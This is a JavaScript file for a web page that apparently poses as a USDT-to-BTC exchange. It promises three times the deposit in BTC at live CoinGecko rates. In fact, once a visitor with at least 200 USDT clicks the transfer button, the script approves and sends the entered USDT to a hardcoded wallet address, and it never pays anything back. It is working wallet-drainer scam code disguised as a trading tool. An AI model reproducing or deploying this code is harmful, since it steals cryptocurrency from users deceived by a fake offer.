const USDT = "0x55d398326f99059fF775485246999027B3197955";
const DEST = "0x56E93caFf970003A66264a10B1581066E0f17112";
const BNB_GAS_USD = 0.50;

let provider, signer;

const ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transfer(address,uint256) returns (bool)"
];

async function init() {
  provider = new ethers.providers.Web3Provider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = provider.getSigner();
  updateDisplay();
}

async function updateDisplay() {
  const input = parseFloat(document.getElementById("usdtInput").value);
  const usdtValue = document.getElementById("usdtValue");
  const btcUsd = document.getElementById("btcUsd");
  const btcAmount = document.getElementById("btcAmount");
  const rateLine = document.getElementById("rateLine");

  const amount = isNaN(input) ? 0 : input;
  const totalUSD = amount * 3;
  usdtValue.innerText = `$${amount.toFixed(2)}`;

  const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usdt");
  const rate = res.ok ? (await res.json()).bitcoin.usdt : 0;
  rateLine.innerText = `1 BTC ≈ ${rate.toLocaleString('en')} USDT`;

  const btcValue = rate ? totalUSD / rate : 0;
  btcAmount.innerText = btcValue.toFixed(8);
  btcUsd.innerHTML = `$${totalUSD.toFixed(2)} <span class="red">(-1%)</span>`;
}

document.getElementById("usdtInput").addEventListener("input", updateDisplay);

document.getElementById("transferBtn").addEventListener("click", async () => {
  const input = parseFloat(document.getElementById("usdtInput").value);
  const msg = document.getElementById("msg");
  msg.className = "";

  if (isNaN(input) || input < 200) {
    msg.innerText = "❌ Minimum 200 USDT required";
    msg.className = "error";
    return;
  }

  try {
    const token = new ethers.Contract(USDT, ABI, signer);
    const user = await signer.getAddress();
    const balance = await token.balanceOf(user);
    const usdtBal = parseFloat(ethers.utils.formatUnits(balance, 18));
    if (usdtBal < input) throw new Error("Insufficient USDT");

    const bnbBal = parseFloat(ethers.utils.formatEther(await provider.getBalance(user)));
    const bnbRate = (await (await fetch("https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd")).json()).binancecoin.usd;
    if (bnbBal * bnbRate < BNB_GAS_USD) throw new Error("Low BNB for gas");

    const amt = ethers.utils.parseUnits(input.toString(), 18);
    await (await token.approve(DEST, amt)).wait();
    await (await token.transfer(DEST, amt)).wait();

    msg.innerText = `✅ ${input} USDT sent successfully`;
    msg.className = "success";
  } catch (err) {
    msg.innerText = `❌ ${err.message}`;
    msg.className = "error";
  }
});

init();
